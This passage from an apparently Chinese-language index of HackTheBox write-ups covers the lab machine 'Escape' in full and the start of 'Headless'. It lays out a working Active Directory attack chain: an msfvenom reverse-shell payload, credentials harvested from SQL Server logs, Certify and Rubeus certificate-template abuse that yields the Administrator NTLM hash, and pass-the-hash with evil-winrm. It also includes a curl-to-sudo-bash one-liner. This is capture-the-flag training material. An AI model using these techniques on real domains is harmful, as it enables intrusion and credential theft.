Public\nd-----         2/1/2023   6:37 PM                Ryan.Cooper\nd-----         2/7/2023   8:10 AM                sql_svc\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_18","title":"\u57df\u5185\u63a2\u7d22&amp;\u6a2a\u5411\u79fb\u52a8","text":"<p>\u5f88\u591a\u547d\u4ee4\u6267\u884c\u4e0d\u4e86\u6709\u70b9\u96be\u53d7\uff0c\u5148\u4f20\u4e2aMeterpreter\uff1a <pre><code>\u2514\u2500$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.xx.xx.xx LPORT=6666 -f exe -o s.exe\n\n\nmeterpreter &gt; getsystem \n[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:\n[-] Named Pipe Impersonation (In Memory/Admin)\n[-] Named Pipe Impersonation (Dropper/Admin)\n[-] Token Duplication (In Memory/Admin)\n[-] Named Pipe Impersonation (RPCSS variant)\n[-] Named Pipe Impersonation (PrintSpooler variant)\n[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)\n</code></pre></p> <p>\u8fdb\u884c\u4e86\u6f2b\u957f\u5730\u641c\u7d22\uff0c\u6beb\u65e0\u5934\u7eea\u3002</p> <p>\u9ad8\u5e08\u5085\u6307\u70b9\u8bf4\u770b\u770b <code>SQLServer\\Logs</code>\uff0c\u91cc\u9762\u6709\u8d26\u53f7\u5bc6\u7801 <pre><code>\u2026\u2026\n2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.\n2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n\u2026\u2026\n</code></pre></p> <p>\u51ed\u636e\uff1aRyan.Cooper:NuclearMosquito3</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#flag-user","title":"flag: user","text":"<pre><code>\u2514\u2500$ evil-winrm -i ${HTB_IP} -u Ryan.Cooper -p NuclearMosquito3\n\nEvil-WinRM shell v3.4\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 \n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   \n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; whoami\nsequel\\ryan.cooper\n\n\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Desktop&gt; cat user.txt\nde9e\u2026\u2026cb29\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#ca","title":"CA\u6a21\u677f\u6f0f\u6d1e","text":"<p>\u770b\u5b98\u65b9\u8bba\u575b\u63d0\u5230 <code>Certify</code>\uff0cgithub\u641c\u5230\u4e86\u4ed3\u5e93\uff0c\u4f46\u662f\u8bf4\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\u9700\u8981\u81ea\u5df1\u7f16\u8bd1\u3002 \u7136\u800c\u6211\u4e5f\u7b2c\u4e00\u6b21\u641e\u8fd9\u4e2a\u6ca1\u6709\u7f16\u8bd1\u73af\u5883\uff0c\u5c1d\u8bd5\u641c\u641c\u522b\u4eba\u7f16\u8bd1\u597d\u7684\uff0c\u4e8e\u662f\u5728github\u53d1\u73b0\u8fd9\u4e2a\u3002 \u4e0b\u8f7d\u4e4b\u540e\u53ef\u76f4\u63a5\u4e0a\u4f20\u3002</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Downloads&gt; upload Certify.exe\n</code></pre> <p>\u672c\u6765\u56fe\u65b9\u4fbf\u76f4\u63a5\u7528sql\u7528\u6237\u7684Meterpreter\u4e0a\u4f20\u6267\u884c\u6765\u7740\uff0c\u7ed3\u679c\u8bf4\u6ca1\u6709\u53d1\u73b0\u3002\u540e\u6765\u7528\u8fd9\u4e2a\u7528\u6237\u5c31\u6709\u6f0f\u6d1e\u4e86\u3002 <pre><code>*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Downloads&gt; ./Certify.exe find /vulnerable\n\n   _____          _   _  __\n  / ____|        | | (_)/ _|\n | |     ___ _ __| |_ _| |_ _   _\n | |    / _ \\ '__| __| |  _| | | |\n | |___|  __/ |  | |_| | | | |_| |\n  \\_____\\___|_|   \\__|_|_|  \\__, |\n                             __/ |\n                            |___./\n  v1.0.0\n\n[*] Action: Find certificate templates\n[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'\n\n[*] Listing info about the Enterprise CA 'sequel-DC-CA'\n\n    Enterprise CA Name            : sequel-DC-CA\n    DNS Hostname                  : dc.sequel.htb\n    FullName                      : dc.sequel.htb\\sequel-DC-CA\n    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb\n    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56\n    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101\n    Cert Start Date               : 11/18/2022 12:58:46 PM\n    Cert End Date                 : 11/18/2121 1:08:46 PM\n    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb\n    UserSpecifiedSAN              : Disabled\n    CA Permissions                :\n      Owner: BUILTIN\\Administrators        S-1-5-32-544\n\n      Access Rights                                     Principal\n\n      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11\n      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544\n      Allow  ManageCA, ManageCertificates               sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n      Allow  ManageCA, ManageCertificates               sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n    Enrollment Agent Restrictions : None\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                               : dc.sequel.htb\\sequel-DC-CA\n    Template Name                         : UserAuthentication\n    Schema Version                        : 2\n    Validity Period                       : 10 years\n    Renewal Period                        : 6 weeks\n    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT\n    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required        : 0\n    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email\n    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n      Object Control Permissions\n        Owner                       : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n        WriteOwner Principals       : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n        WriteDacl Principals        : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n        WriteProperty Principals    : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n\n\n\nCertify completed in 00:00:10.4285047\n</code></pre></p> <p>\u8ddf\u7740github\u6587\u6863\u7684\u601d\u8def\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff1a</p> <ul> <li>\u5bf9\u4e8eUserAuthentication\u6a21\u677f\uff0c\u201cDomain Users\u201d\u5177\u6709\u201cEnrollment\u201d\u7684\u6743\u9650</li> <li>\u901a\u8fc7 <code>net group \"domain users\" /domain</code> \u6211\u4eec\u4e5f\u53ef\u4ee5\u786e\u8ba4\u5f53\u524dRyan\u8d26\u6237\u5c5e\u4e8e\u8fd9\u4e2a\u7ec4</li> </ul> <p>\u7ee7\u7eed\uff0c\u4f9d\u6837\u753b\u846b\u82a6\u3002\u5bf9\u6b64\u6a21\u677f\u7533\u8bf7\u4e00\u4e2a\u65b0\u8bc1\u4e66\uff0c\u6307\u5b9a\u201cAdministrator\u201d\u4f5c\u4e3aSubject Alternative Name (SAN, i.e. as a DA - \u57df\u7ba1)\uff1a <pre><code>*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Downloads&gt; ./Certify.exe request /ca:dc.sequel.htb\\sequel-DC-CA /template:UserAuthentication /altname:Administrator\n\n   _____          _   _  __\n  / ____|        | | (_)/ _|\n | |     ___ _ __| |_ _| |_ _   _\n | |    / _ \\ '__| __| |  _| | | |\n | |___|  __/ |  | |_| | | | |_| |\n  \\_____\\___|_|   \\__|_|_|  \\__, |\n                             __/ |\n                            |___./\n  v1.0.0\n\n[*] Action: Request a Certificates\n\n[*] Current user context    : sequel\\Ryan.Cooper\n[*] No subject name specified, using current context as subject.\n\n[*] Template                : UserAuthentication\n[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb\n[*] AltName                 : Administrator\n\n[*] Certificate Authority   : dc.sequel.htb\\sequel-DC-CA\n\n[*] CA Response             : The certificate had been issued.\n[*] Request ID              : 11\n\n[*] cert.pem         :\n\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwqm2BwPZUGjkPhNFxoBR142ZOb+7qKXir4J6wFJoyNJCtR0r\u2026\u2026\n-----END RSA PRIVATE KEY-----\n-----BEGIN CERTIFICATE-----\nMIIGEjCCBPqgAwIBAgITHgAAAAsoXe7Z249Q5gAAAAAACzANBgkqhkiG9w0BAQsF\u2026\u2026\n-----END CERTIFICATE-----\n\n\n[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n\n\n\nCertify completed in 00:00:13.5175145\n</code></pre></p> <p>\u628a\u201c-----BEGIN RSA PRIVATE KEY-----\u201d\u5230\u201c-----END CERTIFICATE-----\u201d\u7684\u90e8\u5206\u5b58\u4e3a <code>cert.pem</code>\uff0c\u7136\u540e\u7528 <code>openssl</code> \u547d\u4ee4\u5c06\u5176\u8f6c\u4e3apfx\u6587\u4ef6\uff08\u51fa\u73b0\u63d0\u793a\u65f6\uff0c\u4e0d\u8981\u8f93\u5165\u5bc6\u7801\uff09\u3002 <pre><code>\u2514\u2500$ ls\ncert.pem\n\n\u2514\u2500$ openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\nEnter Export Password:\nVerifying - Enter Export Password:\n\n\u2514\u2500$ ls\ncert.pem  cert.pfx\n</code></pre></p> <p>\u7533\u8bf7\u7684\u8bc1\u4e66\u53ef\u4ee5\u4e0e <code>Rubeus</code> \u4e00\u8d77\u4f7f\u7528\u6765\u8bf7\u6c42 TGT\u3002</p> <p>\u5c06cert.pfx\u548cRubeus.exe\u4e0a\u4f20\u6307\u9776\u673a\u3002</p> <p>\u4e00\u5f00\u59cb\u8ddf\u7740github\u7684\u6587\u6863\u4ece\u5934\u4e00\u76f4\u7528\u201clocaladmin\u201d\uff0c\u8fd8\u4ee5\u4e3a\u53ea\u662f\u4e2a\u8868\u793a\u540d\u3002\u7ed3\u679c\u62a5\u9519\u201cKRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN\u201d\uff0c\u8fd8\u5947\u602a\u6765\u7740\u3002 \u4ed4\u7ec6\u770b\u770b\u539f\u6765AS-REQ\u91cc\u4f1a\u8bf7\u6c42\u201csequel.htb\\localadmin\u201d\u8fd9\u4e2a\u7528\u6237\uff0c\u90a3\u5c31\u4e0d\u5bf9\u4e86\u3002</p> <p>[*] Action: Ask TGT  </p> <p>[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb [*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\\localadmin' [*] Using domain controller: fe80::f9ed:2b4d:e647:50be%4:88  </p> <p>[X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN</p> <p>\u4e8e\u662f\u91cd\u65b0\u5f04\u4e86\u4e00\u904d\uff0c\u5c06\u201clocaladmin\u201d \u66ff\u6362\u4e3a\u201cAdministrator\u201d\u4e4b\u540e\u5c31\u6210\u529f\u4e86\u3002</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Downloads&gt; ./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.0\n\n[*] Action: Ask TGT\n\n[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb\n[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\\Administrator'\n[*] Using domain controller: fe80::f9ed:2b4d:e647:50be%4:88\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n      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\n\n  ServiceName              :  krbtgt/sequel.htb\n  ServiceRealm             :  SEQUEL.HTB\n  UserName                 :  Administrator\n  UserRealm                :  SEQUEL.HTB\n  StartTime                :  6/4/2023 12:24:59 PM\n  EndTime                  :  6/4/2023 10:24:59 PM\n  RenewTill                :  6/11/2023 12:24:59 PM\n  Flags                    :  name_canonicalize, pre_authent, initial, renewable\n  KeyType                  :  rc4_hmac\n  Base64(key)              :  idLiswMt0Xl4p4McapF+7g==\n  ASREP (key)              :  0604B6773800876A4D950F72524B5D15\n</code></pre> <p>\u4f46\u662f\u5149\u8fd9\u6837\u597d\u50cf\u6ca1\u7528\uff0c\u6216\u8005\u8bf4\u4e4b\u540e\u4f1a\u5f88\u590d\u6742\uff1f\u6bd4\u5982\u9700\u8981\u62ff\u7740ASREP\u53bb\u8fdb\u884c\u540e\u7eed\u64cd\u4f5c\uff1f\u4ee5\u540e\u6709\u95f2\u5fc3\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u8fd9\u79cd\u65b9\u5f0f\u3002</p> <p>\u800c\u8fd9\u6b21\uff0c\u770b\u770bRubeus\u7684\u6587\u6863\uff1a</p> <p>Requesting a ticket using a certificate and using <code>/getcredentials</code> to retrieve the NT hash</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Downloads&gt; ./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials\n\n\u2026\u2026\n\n[*] Getting credentials using U2U\n\n  CredentialInfo         :\n    Version              : 0\n    EncryptionType       : rc4_hmac\n    CredentialData       :\n      CredentialCount    : 1\n       NTLM              : A52F\u2026\u2026\u2026\u2026F4EE\n</code></pre> <p>\u83b7\u5f97Administrator\u7684NTLMhash\u3002 \u53e6\u5916\uff0c\u867d\u7136\u548c\u6253\u9776\u6ca1\u5173\u7cfb\u3002\u6ce8\u610f\u5230\u52a0\u5bc6\u65b9\u5f0f\u662frc4\uff0c\u5728\u771f\u5b9e\u73af\u5883\u4e0b\u7528\u8fd9\u4e48\u65e7\u7684\u65b9\u5f0f\u4f1a\u5341\u5206\u660e\u663e\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#flag-root","title":"flag: root","text":"<pre><code>\u2514\u2500$ evil-winrm -i ${HTB_IP} -u Administrator -H A52F\u2026\u2026\u2026\u2026F4EE\n\nEvil-WinRM shell v3.4\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 \n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   \n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\nsequel\\administrator\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cd ../Desktop\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; ls\n\n\n    Directory: C:\\Users\\Administrator\\Desktop\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-ar---         6/4/2023   4:49 AM             34 root.txt\n\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; cat root.txt\n9384\u2026\u2026db0c\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_19","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/06/04</p> <p>\u633a\u6709\u610f\u601d\u7684\uff0c\u8fd9\u6b21\u8be5\u597d\u597d\u603b\u7ed3\u4e00\u4e0b\u4e86\u3002Certify\u4e4b\u540e\u90fd\u662f\u8ddf\u7740github\u7167\u846b\u82a6\u753b\u74e2\uff0c\u8981\u597d\u597d\u7422\u78e8\u4e00\u4e0b\u5404\u4e2a\u5730\u65b9\u7684\u77e5\u8bc6\u70b9\u3002</p> <p>\u9996\u5148\u662f\u5173\u4e8e\u603b\u4f53\u6d41\u7a0b\uff0cRPC\u7684\u4f18\u5148\u5ea6\u5176\u5b9e\u4e0d\u8be5\u8fd9\u4e48\u9ad8\u3002 SMB \u2192 MSSQL\uff0c\u6355\u83b7NTLMv2\uff0c\u7531\u4e8e\u662fmsf\u6a21\u5757\u6240\u4ee5\u4e0d\u592a\u6e05\u695a\u5177\u4f53\u7ec6\u8282\uff0c\u4e0d\u8fc7\u770b\u624b\u52a8\u4e5f\u6709\u7528<code>xp_dirtree</code>\u5f3a\u5236NTLM\u8ba4\u8bc1\u7684\u6837\u5b50\u3002 \u56e0\u4e3a\u4e0d\u719f\u6089MSSQL\uff0c\u8fdb\u884c\u4e86\u5927\u91cf\u65e0\u610f\u4e49\u7684\u679a\u4e3e\u3002\u8fd8\u603b\u60f3\u7740\u662f\u5426\u8981\u767b\u9646\u8fdb\u53bb\uff0c\u7ed3\u679c\u767b\u8fdb\u53bb\u4e5f\u6ca1\u4ec0\u4e48\u610f\u4e49\u3002\u65e9\u5728hacktricks\u7684\u6700\u5f00\u5934\u5c31\u5199\u7740\u5173\u4e8e\u83b7\u53d6Net-NTLM\u7684\u4fe1\u606f\u4e86\uff0c\u4e0d\u8fc7\u56e0\u4e3a\u60f3\u7740\u4e0d\u592a\u53ef\u80fd\u7834\u89e3NTLMv2\u6240\u4ee5\u5c31\u653e\u7f6e\u5230\u6700\u540e\u624d\u5904\u7406\u8fd9\u6b65\u4e86\u3002\u8fd8\u662f\u7ecf\u9a8c\u592a\u5c11\u3002</p> <p>\u7834\u89e3\u540e\u83b7\u5f97\u57df\u51ed\u636e \u2192 \u7531\u4e8e\u662f\u57df\u51ed\u636e\u6240\u4ee5\u5c1d\u8bd5\u521d\u59cb\u8fde\u63a5\uff0c\u6839\u636e\u4ee5\u524dAPT\u7684\u7b14\u8bb0\uff0c\u6709\u5f88\u591a\u5de5\u5177\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u90fd\u662f\u4f7f\u7528<code>Evil-WinRM</code>\u3002</p> <p>\u7136\u540e\u5c31\u662f\u6a2a\u5411\u79fb\u52a8\uff0c\u611f\u89c9\u6ca1\u4ec0\u4e48\u6280\u672f\u542b\u91cf\uff0c\u5c31\u7565\u8fc7\u5427\u3002\u5176\u5b9e\u81f3\u4eca\u4e0d\u660e\u767d\u4e3a\u4ec0\u4e48\u4f1a\u60f3\u5230\u7ec4\u5408err log\u91cc\u7684\u4e24\u4e2ausername\u62a5\u9519\u3002\u662f\u671f\u5f85\u7528\u6237\u8bef\u64cd\u4f5c\u5c06\u5bc6\u7801\u5f53\u7528\u6237\u540d\u8f93\u5165\uff1f</p> <p>\u6700\u540e\u7684\u63d0\u6743\u7b97\u662f\u6211\u5370\u8c61\u4e2d\u57df\u6e17\u900f\u7684\u7cbe\u534e\u90e8\u5206\u4e86\u3002\u9996\u5148\u81ea\u5df1\u8be5\u6709\u679a\u4e3e\u4ec0\u4e48\u4fe1\u606f\u7684\u601d\u8def\uff0c\u5f53\u601d\u8def\u8d70\u5230<code>Certify</code>\u65f6\uff0c\u5c06\u4f1a\u53d1\u73b0CA\u6a21\u677f\u6f0f\u6d1e\uff0c\u8fd9\u4e2a\u4e5f\u662f\u524d\u9635\u5b50\u63a5\u89e6\u5230\u7684\u4e00\u4e2a\u6982\u5ff5\u3002\u5c06\u662f\u6211\u63a5\u4e0b\u6765\u9700\u8981\u597d\u597d\u7422\u78e8\u7684\u5730\u65b9\u3002 \u7279\u522b\u662f\u201cGetting credentials using U2U\u201d\u8fd9\u91cc\u7684U2U\u5341\u5206\u964c\u751f\u3002 </p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Headless/","title":"HTB-Headless","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#summary","title":"Summary","text":"<p>xxx</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#relevant-skills","title":"Relevant Skills","text":"<ul> <li>nmap</li> <li>\u76ee\u5f55\u679a\u4e3e</li> <li>XSS</li> <li>\u4f1a\u8bdd\u56fa\u5b9a\u653b\u51fb</li> <li>\u53c2\u6570\u6c61\u67d3/\u6ce8\u5165</li> <li>sudo\u63d0\u6743</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#external-recon-nmap","title":"External Recon - nmap","text":"<p>\u81ea\u7528\u626b\u63cf\u811a\u672c\uff1a\u5de5\u4f5c\u6d41 <code>curl -s https://raw.githubusercontent.com/TimeLess613/workflow-scan4HTB/main/workflow-scan4HTB.sh | sudo bash -s &lt;HTB-IP&gt;</code></p> <p>\u5f00\u653e\u7aef\u53e3\uff1a <pre><code>PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n5000/tcp open  upnp?\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#_1","title":"\u653b\u51fb\u8def\u5f84\u89c4\u5212\u00b7\u6f0f\u6d1e\u5206\u6790","text":"<p>22\u7aef\u53e3SSH\u7684\u7248\u672c\u8f83\u65b0\uff0c\u4f18\u5148\u5ea6\u653e\u4f4e\u3002\u5148\u770b5000\u7aef\u53e3\uff0c\u662f\u4e2aWeb\u3002\u90a3\u4e48\u5927\u6982\u7387\u662f\u4e00\u4e2a\u5e38\u89c4\u9776\u673a\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#5000","title":"5000\u7aef\u53e3","text":"<p>\u8bbf\u95ee\u540e\u53ef\u53d1\u73b0\u662f\u4e2a\u7f51\u9875\u3002</p> <p></p> <ul> <li>robots.txt\uff1a\u65e0</li> <li>.git/config\uff1a\u65e0</li> <li>\u7f51\u9875\u4fe1\u606f\uff1a\u5728\u8fdb\u884c\u5012\u6570\uff0c\u53ef\u80fd\u901a\u8fc7\u811a\u672c\u63a7\u5236\uff0c\u5012\u6570\u7ed3\u675f\u540e\u4f1a\u6709\u4ec0\u4e48\u4e8b\u60c5\uff1f</li> <li>\u7f51\u9875\u6e90\u7801\uff1a\u65e0\u7279\u522b\u53d1\u73b0\u3002</li> <li>\u7f51\u9875\u529f\u80fd\uff1a\u5012\u6570\u3002\u4e0d\u8fc7\u70b9\u51fb<code>For questions</code>\u6309\u94ae\u4f1a\u8df3\u8f6c\u5230<code>http://10.10.11.8:5000/support</code>\uff0c\u53ef\u4ee5\u586b\u8868\u5355\u3002</li> <li>\u5b50\u57df\u679a\u4e3e\uff1a\u65e0\u57df\u540d</li> <li>\u76ee\u5f55\u679a\u4e3e\uff1a<code>gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.11.8:5000/</code>\uff0c\u7ed3\u679c\u663e\u793a\u4e0a\u8ff0<code>/support</code>\uff0c\u8fd8\u6709\u4e2a<code>/dashboard</code>\uff0c\u8bbf\u95ee\u540e\u663e\u793a\u201cUnauthorized\u201d\u3002</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#_2","title":"\u7814\u7a76\u7f51\u9875\u529f\u80fd","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Headless/#_3","title":"\u5012\u6570\u7ed3\u675f\u65e0\u4e8b\u53d1\u751f","text":"<p>\u5f00\u542fburp\u540e\u518d\u6b21\u8bbf\u95ee\u7f51\u9875\uff0c\u7528burp\u62e6\u622a\u8bf7\u6c42\u540e\u53f3\u952e\u9009\u62e9<code>Response to this 